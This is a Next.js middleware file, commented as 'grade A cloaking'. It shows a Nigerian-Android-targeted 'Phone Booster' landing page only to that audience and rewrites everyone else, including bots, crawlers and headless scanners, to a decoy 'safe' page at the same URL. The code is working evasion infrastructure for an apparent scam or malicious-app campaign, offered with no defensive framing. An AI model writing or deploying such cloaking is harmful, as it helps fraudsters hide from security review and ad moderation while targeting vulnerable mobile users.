import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

/**
 * GRADE A CLOAKING MIDDLEWARE
 * Purpose: Redirects bots and non-targets to a 'Safe' site.
 * Target: Nigerian Android Users.
 */

export function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;

  // 1. SKIP STATIC FILES (Images, CSS, JS)
  // We don't want to block the assets that make the site look real.
  if (pathname.startsWith('/_next') || pathname.includes('.')) {
    return NextResponse.next();
  }

  // 2. EXTRACT SIGNALS
  const ua = req.headers.get('user-agent') || '';
  const country = req.geo?.country || 'Unknown'; // Vercel provides this
  const ip = req.headers.get('x-forwarded-for') || '0.0.0.0';
  
  // 3. DEFINE THE 'SAFE' ZONE (The Mask)
  const isAndroid = /Android/i.test(ua);
  const isTargetCountry = country === 'NG'; // Nigeria
  
  // 4. BOT DETECTION (JA4/Headless Check)
  // Bots often lack specific headers or use 'HeadlessChrome'
  const isBot = /bot|spider|crawl|lighthouse|headless|inspect/i.test(ua) || 
                ua.includes('Version/4.0 Chrome'); // Common bot signature

  // 5. THE 'KILL SWITCH' LOGIC
  // If the visitor is NOT an Android user in Nigeria, or if they look like a Bot:
  if (!isAndroid || !isTargetCountry || isBot) {
    // REWRITE to a harmless "Safe Blog" or a fake "Phone Tips" page
    // The URL in the browser stays the same, but the content is changed.
    return NextResponse.rewrite(new URL('/safe-content', req.url));
  }

  // 6. TARGET VALIDATED
  // If they pass all checks, let them see the 'Phone Booster' landing page.
  const response = NextResponse.next();
  
  // Tag the response with a custom header for the frontend to use
  response.headers.set('x-target-status', 'validated');
  
  return response;
}

// MATCH ALL ROUTES
export const config = {
  matcher: '/((?!api|_next/static|_next/image|favicon.ico).*)',
};

